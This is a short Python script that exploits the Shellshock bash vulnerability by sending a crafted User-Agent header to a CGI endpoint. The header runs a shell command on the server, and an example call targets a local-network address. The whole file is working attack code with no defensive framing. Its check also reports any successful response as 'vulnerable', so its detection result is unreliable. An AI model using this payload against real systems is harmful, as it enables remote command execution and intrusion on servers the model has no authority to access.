import requests

class ShellshockExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.headers = {
            "User-Agent": "() { :; }; echo Content-Type: text/plain ; echo ; /bin/bash -c 'whoami'"
        }

    def run(self):
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=3)
            return {"vulnerable": True, "output": response.text.strip()}
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}

# Example usage
if __name__ == "__main__":
    shellshock = ShellshockExploit("http://192.168.1.1/cgi-bin/status")
    print(shellshock.run())
